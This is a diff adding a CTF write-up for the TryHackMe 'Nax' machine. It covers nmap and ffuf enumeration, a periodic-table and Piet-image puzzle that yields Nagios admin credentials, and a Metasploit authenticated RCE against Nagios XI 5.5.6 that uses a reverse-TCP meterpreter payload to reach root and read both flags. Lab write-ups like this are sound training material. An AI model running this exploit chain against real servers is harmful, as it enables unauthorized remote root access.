@@ -1,49 +1,13 @@
- 
- Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-01 23:59 WAT
- NSE: Loaded 155 scripts for scanning.
- NSE: Script Pre-scanning.
- NSE: Starting runlevel 1 (of 3) scan.
- Initiating NSE at 23:59
- Completed NSE at 23:59, 0.00s elapsed
- NSE: Starting runlevel 2 (of 3) scan.
- Initiating NSE at 23:59
- Completed NSE at 23:59, 0.00s elapsed
- NSE: Starting runlevel 3 (of 3) scan.
- Initiating NSE at 23:59
- Completed NSE at 23:59, 0.00s elapsed
- Initiating Ping Scan at 23:59
- Scanning 10.10.208.82 [2 ports]
- Completed Ping Scan at 23:59, 0.15s elapsed (1 total hosts)
- Initiating Parallel DNS resolution of 1 host. at 23:59
- Completed Parallel DNS resolution of 1 host. at 23:59, 0.03s elapsed
- Initiating Connect Scan at 23:59
- Scanning 10.10.208.82 [1000 ports]
- Discovered open port 80/tcp on 10.10.208.82
- Discovered open port 443/tcp on 10.10.208.82
- Discovered open port 25/tcp on 10.10.208.82
- Discovered open port 22/tcp on 10.10.208.82
- Discovered open port 389/tcp on 10.10.208.82
- Completed Connect Scan at 23:59, 11.51s elapsed (1000 total ports)
- Initiating Service scan at 23:59
- Scanning 5 services on 10.10.208.82
- Completed Service scan at 00:00, 14.29s elapsed (5 services on 1 host)
- NSE: Script scanning 10.10.208.82.
- NSE: Starting runlevel 1 (of 3) scan.
- Initiating NSE at 00:00
- Completed NSE at 00:00, 17.66s elapsed
- NSE: Starting runlevel 2 (of 3) scan.
- Initiating NSE at 00:00
- Completed NSE at 00:00, 6.02s elapsed
- NSE: Starting runlevel 3 (of 3) scan.
- Initiating NSE at 00:00
- Completed NSE at 00:00, 0.00s elapsed
- Nmap scan report for 10.10.208.82
- Host is up, received syn-ack (0.15s latency).
- Scanned at 2021-11-01 23:59:42 WAT for 50s
- Not shown: 995 filtered tcp ports (no-response)
+# Nax
+
+## Enumeration
+
+### nmap
+
+```
  PORT    STATE SERVICE   REASON  VERSION
  22/tcp  open  ssh       syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
- | ssh-hostkey: 
+ | ssh-hostkey:
  |   2048 62:1d:d9:88:01:77:0a:52:bb:59:f9:da:c1:a6:e3:cd (RSA)
  | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCw9lXSbmWYgGcDpP5NiHE9MMRQktk72HpmKY50dVs/GbfJMNa29eJNKsZ2XfAVsGUuxRdX42/fvaAUOoSZlNlARJUOhS+3fRX14Qx9itHqEoYTXXnSZ+lYc4HGbMkbGlbW3CqQ6zxO9kEbe8DbFi9BPkGOvjMk5mrVYqOpROlZwJvwCtK4g+LNkZibj3VZvZ+Ex410r4Xqd4TeIe+NRVmCEG5I57w60wZTwS6WAhQ86Td8ZhDr0hlN82vKe8KK8Q6Qyt4NNa4GrwJAil0DMSSrSdgiFPWfSBN0RcaGq6xTyd3m4bUmKfqSJ+hhvpoQ5CJNQK5dtIfLulV5iEVWXKtV
  |   256 af:67:7d:24:e5:95:f4:44:72:d1:0c:39:8d:cc:21:15 (ECDSA)
@@ -81,14 +45,14 @@
  |_-----END CERTIFICATE-----
  80/tcp  open  http      syn-ack Apache httpd 2.4.18 ((Ubuntu))
  |_http-title: Site doesn't have a title (text/html).
- | http-methods: 
+ | http-methods:
  |_  Supported Methods: OPTIONS GET HEAD POST
  389/tcp open  ldap      syn-ack OpenLDAP 2.2.X - 2.3.X
  443/tcp open  ssl/https syn-ack Apache/2.4.18 (Ubuntu)
- | http-methods: 
+ | http-methods:
  |_  Supported Methods: GET HEAD POST
  |_http-title: 400 Bad Request
- | tls-alpn: 
+ | tls-alpn:
  |_  http/1.1
  | ssl-cert: Subject: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US/organizationalUnitName=Development/localityName=St. Paul
  | Issuer: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US/organizationalUnitName=Development/localityName=St. Paul
@@ -125,18 +89,166 @@
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  |_ssl-date: TLS randomness does not represent time
  Service Info: Host:  ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
- 
- NSE: Script Post-scanning.
- NSE: Starting runlevel 1 (of 3) scan.
- Initiating NSE at 00:00
- Completed NSE at 00:00, 0.00s elapsed
- NSE: Starting runlevel 2 (of 3) scan.
- Initiating NSE at 00:00
- Completed NSE at 00:00, 0.00s elapsed
- NSE: Starting runlevel 3 (of 3) scan.
- Initiating NSE at 00:00
- Completed NSE at 00:00, 0.00s elapsed
- Read data files from: /usr/bin/../share/nmap
- Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
- Nmap done: 1 IP address (1 host up) scanned in 51.38 seconds
- 
+```
+
+### ffuf
+
+```
+.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
+.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
+.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
+cgi-bin/                [Status: 403, Size: 277, Words: 20, Lines: 10]
+index.html              [Status: 200, Size: 1332, Words: 629, Lines: 29]
+javascript              [Status: 301, Size: 317, Words: 20, Lines: 10]
+index.php               [Status: 200, Size: 2968, Words: 766, Lines: 72]
+nagios                  [Status: 401, Size: 459, Words: 42, Lines: 15]
+server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
+```
+
+After visiting the wesite we get a weird page with `"elements"`
+
+periodic table elements `Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr`
+
+The corresponding numbers (atomic value) are found on google and we check if those are `ASCII` chars:
+
+`python3 -c "print(''.join([chr(i) for i in [47, 80, 73, 51, 84, 46, 80, 78, 103]]))"`
+
+```
+/PI3T.PNg
+```
+
+A hidden png? lets go get that and extract exif data from it
+
+<img src="PI3T.png" alt="piet" width=200 style="margin:10px"/>
+
+```
+exiftool /PI3T.PNg
+ExifTool Version Number : 12.16
+File Name : PI3T.PNg
+Directory : /home/nair0lf32/Desktop/Stuff/THM/Nax
+File Size : 959 KiB
+File Modification Date/Time : 2021:11:02 00:29:28+01:00
+File Access Date/Time : 2021:11:02 00:29:28+01:00
+File Inode Change Date/Time : 2021:11:02 00:29:28+01:00
+File Permissions : rw-r--r--
+File Type : PNG
+File Type Extension : png
+MIME Type : image/png
+Image Width : 990
+Image Height : 990
+Bit Depth : 8
+Color Type : Palette
+Compression : Deflate/Inflate
+Filter : Adaptive
+Interlace : Noninterlaced
+Palette : (Binary data 768 bytes, use -b option to extract)
+Transparency : (Binary data 256 bytes, use -b option to extract)
+Artist : Piet Mondrian
+Copyright : Piet Mondrian, tryhackme 2020
+Image Size : 990x990
+Megapixels : 0.980
+```
+
+Googling piet mondrian didnt really help me...so I started to look for others steganograpy methods
+
+SEEMS LIKE A LANGUAGE CALLED PIET WAS CREATED AFTER THE AUTHOR'S
+
+let's google more about PIET
+
+And there is an online tool to execute that at `https://www.bertnase.de/npiet/npiet-execute.php`
+
+```
+libpng warning: Extra compressed data.
+libpng warning: Extra compression data.
+nagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYna
+```
+
+From that horribly long sequence we notice its just credentials repeated with url encoded like separator (%)
+
+So we get
+
+`nagiosadmin : n3p3UQ&9BjLp4$7uhWdY`
+
+we can use that to login at `nagios` page
+
+```
+Nagios XI 5.5.6
+```
+
+We google it...and it seems that its an interresting one
+
+```
+CVE-2019-15949 : CRITICAL RCE to root with getprofile.sh
+CVE-2018-15708 : CRITICAL remote command execution
+CVE-2018-15710 : HIGH privilege escalation via Autodiscover_new.php.
+```
+
+First one is the most critical
+
+we fire metasploit up and use
+
+`exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce`
+
+```
+Module options (exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce):
+
+Name Current Setting Required Description
+
+---
+
+FINISH_INSTALL false no If the Nagios XI installation has not been completed, try to do so. This includes signing the license agreement.
+PASSWORD n3p3UQ&9BjLp4$7uhWdY yes Password to authenticate with
+Proxies no A proxy chain of format type:host:port[,type:host:port][...]
+RHOSTS 10.10.79.218 yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+RPORT 80 yes The target port (TCP)
+SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+SRVPORT 8080 yes The local port to listen on.
+SSL false no Negotiate SSL/TLS for outgoing connections
+SSLCert no Path to a custom SSL certificate (default is randomly generated)
+TARGETURI /nagiosxi/ yes The base path to the Nagios XI application
+URIPATH no The URI to use for this exploit (default is random)
+USERNAME nagiosadmin yes Username to authenticate with
+VHOST no HTTP server virtual host
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+Name Current Setting Required Description
+
+---
+
+LHOST 10.8.226.203 yes The listen address (an interface may be specified)
+LPORT 4444 yes The listen port
+
+Exploit target:
+
+Id Name
+
+---
+
+1 Linux (x64)
+```
+
+And we get a meterpreter session
+
+we go /home/galand for first flag
+
+```
+meterpreter > cat user.txt
+THM{nax_user_flag}
+```
+
+Time for more privileges...
+
+haha joking...not this time...we already root (most critical RCE vuln duh)
+
+```
+meterpreter > getuid
+Server username: root
+```
+
+```
+meterpreter > cat root.txt
+THM{nax_root_flag}
+```
+
+that was a CRITICAL hit
